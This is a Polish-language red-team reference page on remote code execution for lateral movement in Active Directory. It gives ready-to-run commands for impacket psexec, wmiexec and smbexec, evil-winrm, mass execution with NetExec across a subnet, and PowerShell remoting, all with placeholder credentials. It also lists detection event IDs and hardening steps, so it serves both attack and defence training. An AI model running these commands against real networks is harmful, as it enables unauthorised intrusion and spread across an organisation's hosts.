---
title: "Zdalne wykonanie (PsExec/WMI/WinRM)"
category: "red-team"
tags: ["lateral-movement", "execution"]
platform: "windows"
mitre: ["T1021"]
difficulty: "intermediate"
updated: "2026-07-11"
author: "core"
---

# Zdalne wykonanie kodu w AD

## TL;DR
Cztery główne kanały: SMB/PsExec (głośny, tworzy usługę), WMI (ciszej), WinRM (natywny, port 5985), DCOM. Wybór zależy od dostępnych portów i OPSEC.

## Metody
```bash
# PsExec (SMB, tworzy usługę + plik – NAJgłośniejszy)
impacket-psexec corp.local/user:'Pass'@10.10.10.20

# WMI (bez pliku na dysku, port 135 – ciszej)
impacket-wmiexec corp.local/user:'Pass'@10.10.10.20

# WinRM (natywny remoting, 5985/5986)
evil-winrm -i 10.10.10.20 -u user -p 'Pass'

# SMBexec (semi-interaktywny, przez usługę i pliki bat)
impacket-smbexec corp.local/user:'Pass'@10.10.10.20

# NetExec – wykonaj polecenie masowo
nxc winrm 10.10.10.0/24 -u user -p 'Pass' -x "ipconfig"
```
```powershell
# Natywnie PowerShell Remoting
Invoke-Command -ComputerName srv01 -ScriptBlock { whoami } -Credential $cred
Enter-PSSession -ComputerName srv01 -Credential $cred
```

## Wykrywanie (Blue Team)
```text
PsExec  -> Event 7045 (nowa usługa PSEXESVC), 5145 (share ADMIN$), plik w C:\Windows
WMI     -> Event 4688 wmiprvse.exe -> proces potomny; WMI-Activity 5857/5860
WinRM   -> Event 4624 logon, wsmprovhost.exe jako parent
```

## Mitygacja / Hardening
- Ogranicz zdalne logowania adminów (tiering, „Deny logon" GPO).
- Włącz logowanie WMI/WinRM, alertuj na PSEXESVC.
- Host firewall: ogranicz 135/445/5985 do zarządzania.

## Źródła
- [Impacket](https://github.com/fortra/impacket) · [Evil-WinRM](https://github.com/Hackplayers/evil-winrm)
